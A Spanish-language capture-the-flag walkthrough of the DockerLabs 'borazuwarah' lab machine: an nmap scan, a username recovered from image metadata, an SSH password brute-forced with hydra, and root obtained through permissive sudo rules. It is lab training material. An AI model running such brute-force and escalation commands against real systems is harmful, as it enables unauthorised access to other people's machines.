### Enumeración
#### Conectividad
Lo primero de todo es comprobar que tenemos conectividad con un `ping`.
``` bash
┌──(kali㉿kali)-[~/dockerlabs/muyFaciles/borazuwarah]
└─$ ping -c2 172.17.0.2
PING 172.17.0.2 (172.17.0.2) 56(84) bytes of data.
64 bytes from 172.17.0.2: icmp_seq=1 ttl=64 time=0.063 ms
64 bytes from 172.17.0.2: icmp_seq=2 ttl=64 time=0.103 ms

--- 172.17.0.2 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1019ms
rtt min/avg/max/mdev = 0.063/0.083/0.103/0.020 ms
```
#### Escaneo de puertos
Ahora que sabemos que tenemos conectividad vamos a escanear los servicios activos con el siguiente comando:
``` bash
nmap -p- -sS -sC -sV --min-rate 5000 --open -Pn -vvv -n 172.17.0.2 -oN scan.txt
```
Y obtendremos la siguiente salida:
``` bash
┌──(kali㉿kali)-[~/dockerlabs/muyFaciles/borazuwarah]
└─$ cat scan.txt 
# Nmap 7.98 scan initiated Fri Jan  2 16:34:06 2026 as: /usr/lib/nmap/nmap --privileged -p- -sS -sC -sV --min-rate 5000 --open -Pn -vvv -n -oN scan.txt 172.17.0.2
Nmap scan report for 172.17.0.2
Host is up, received arp-response (0.0000030s latency).
Scanned at 2026-01-02 16:34:07 CET for 6s
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 64 OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
| ssh-hostkey: 
|   256 3d:fd:d7:c8:17:97:f5:12:b1:f5:11:7d:af:88:06:fe (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBDuOdJLZN+CNU+7dcTJQbPr6zY2+Ou1YFR0w9Pan1DfaPUZljRHJcNmvSncrihzQ3HOAHfMWWvSzN+ZMC0YmWoA=
|   256 43:b3:ba:a9:32:c9:01:43:ee:62:d0:11:12:1d:5d:17 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGDv2JqKvBCR+Badmkr7YKPypEYshuCXxzM5+YdozyBD
80/tcp open  http    syn-ack ttl 64 Apache httpd 2.4.59 ((Debian))
|_http-server-header: Apache/2.4.59 (Debian)
|_http-title: Site doesn't have a title (text/html).
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
MAC Address: 02:42:AC:11:00:02 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Jan  2 16:34:13 2026 -- 1 IP address (1 host up) scanned in 7.00 seconds
```
Como vemos tenemos abierto el puerto $22$ (servicio `ssh`) y el $80$ (servicio `HTTP`).
#### Escaneo de servicios
##### HTTP
Si ponemos la dirección IP de la máquina en el navegador, nos encontraremos una foto de un kinder sorpresa, nos la descargaremos en nuestra máquina para hacerle técnicas de esteganografía a ver si encontramos algo.
Lo primero será mirar los metadatos de la imagen con `exiftool`, obteniendo:
``` bash
┌──(kali㉿kali)-[~/dockerlabs/muyFaciles/borazuwarah]
└─$ exiftool imagen.jpeg 
ExifTool Version Number         : 13.44
File Name                       : imagen.jpeg
Directory                       : .
File Size                       : 19 kB
File Modification Date/Time     : 2026:01:02 16:37:13+01:00
File Access Date/Time           : 2026:01:02 16:37:13+01:00
File Inode Change Date/Time     : 2026:01:02 16:37:13+01:00
File Permissions                : -rw-rw-r--
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
JFIF Version                    : 1.01
Resolution Unit                 : None
X Resolution                    : 1
Y Resolution                    : 1
XMP Toolkit                     : Image::ExifTool 12.76
Description                     : ---------- User: borazuwarah ----------
Title                           : ---------- Password:  ----------
Image Width                     : 455
Image Height                    : 455
Encoding Process                : Baseline DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)
Image Size                      : 455x455
Megapixels                      : 0.207
```
Obtenemos el usuario "**borazuwarah**" al que le podremos probar un ataque de fuerza bruta.
### Explotación
Vamos a lanzar un ataque de fuerza bruta con `hydra` al usuario encontrado para ver qué obtenemos, para ello lanzamos el comando
``` bash
hydra -l borazuwarah -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2 -t 4
```
Y obtenemos:
``` bash
┌──(kali㉿kali)-[~/dockerlabs/muyFaciles/borazuwarah]
└─$ hydra -l borazuwarah -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2 -t 4
Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-01-02 16:40:37
[DATA] max 4 tasks per 1 server, overall 4 tasks, 14344399 login tries (l:1/p:14344399), ~3586100 tries per task
[DATA] attacking ssh://172.17.0.2:22/
[22][ssh] host: 172.17.0.2   login: borazuwarah   password: 123456
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-01-02 16:40:40
```
Gracias a esto ya sabemos que nos podemos autenticar con `<borazuwarah:123456>` a través de `ssh`.
### Escalada de privilegios
Lo primero que probaremos es a poner `sudo -l` a ver si encontramos algún binario en el que tengamos permisos y encontramos lo siguiente:
``` bash
borazuwarah@2693e9e6b2a2:~$ sudo -l
Matching Defaults entries for borazuwarah on 2693e9e6b2a2:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    use_pty

User borazuwarah may run the following commands on 2693e9e6b2a2:
    (ALL : ALL) ALL
    (ALL) NOPASSWD: /bin/bash
```
Encontramos ese `(ALL : ALL) ALL` que nos dice que si ponemos `sudo su` ya seríamos `root` y tendríamos el control total de la máquina. Pero también vemos que podemos ejecutar `/bin/bash` como `root` sin poner la contraseña, así que si ponemos `sudo /bin/bash` obtenemos lo siguiente (vamos también a poner la explotación de lo anterior):
``` bash
borazuwarah@2693e9e6b2a2:~$ sudo su
root@2693e9e6b2a2:/home/borazuwarah# whoami
root
root@2693e9e6b2a2:/home/borazuwarah# exit
exit
borazuwarah@2693e9e6b2a2:~$ sudo /bin/bash
root@2693e9e6b2a2:/home/borazuwarah# whoami
root
root@2693e9e6b2a2:/home/borazuwarah#
```
Ahora sí, ya tenemos control total de la máquina.
